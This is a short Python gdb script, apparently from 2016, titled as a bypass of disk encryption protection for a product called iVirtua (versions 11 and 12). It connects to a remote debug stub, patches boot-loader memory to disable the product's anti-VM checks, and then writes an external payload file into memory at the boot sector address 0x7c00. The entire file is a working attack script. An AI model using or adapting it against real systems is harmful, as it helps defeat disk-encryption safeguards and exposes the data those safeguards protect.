# bypass disk encryption protection
# 15/06/2016 
# -snp
#
# works with iVirtua (version 11 and 12)
# disable anti-vm protection (cpuid, time checks, anything else)
# 
import time
PAYLOAD='asm/main'
ADDRESS=0x00007c00
BREAK="*0x00007c00"
payload=''

f=open(PAYLOAD,'rb')
payload=f.read()
f.close()

gdb.execute("tar remote localhost:1234")

# this address changes from 11 to 12 and probally will for newer versions
# should be loaded dynamically
#
bp1 = gdb.Breakpoint("*0xb755")
bp1.silent=True

bp2 = gdb.Breakpoint("*0x7c00")
bp2.enabled = False
bp2.silent=True

dstep = 0
dance = [ "_o_", "<o_", "<o>", "\\o>", "<o/", "\\o/" ]

def stopHandler(stopEvent):
    for b in stopEvent.breakpoints:
        if b == bp1: 
            gdb.write("boot_load hit, removing anti-vm protection \\o/\r\n")
            gdb.execute("set {short}0xa242 = 0xc033")
 #           gdb.execute("set {short}0x9f77 = 0x9090")
 #           gdb.execute("set {short}0x8e8f = 0x0001")
            bp2.enabled=True
            bp1.enabled=False
        elif b == bp2: 
            #print "7c00 hit %d" % bp2.hit_count
            if bp2.hit_count == 2:
                gdb.write("got the hit, doing the dance\r\n")
                dstep = 0
                for i in range(len(payload)):
                    gdb.execute("set {char}0x%x = 0x%x" % (ADDRESS+i, ord(payload[i])))
                    if (i % 10) == 0: 
                        print("\r%s " % dance[dstep])
                        dstep = (dstep + 1) % 6
                        time.sleep(.0100)
                bp2.enabled=False
    gdb.execute("continue")

gdb.events.stop.connect(stopHandler)
gdb.execute("continue")
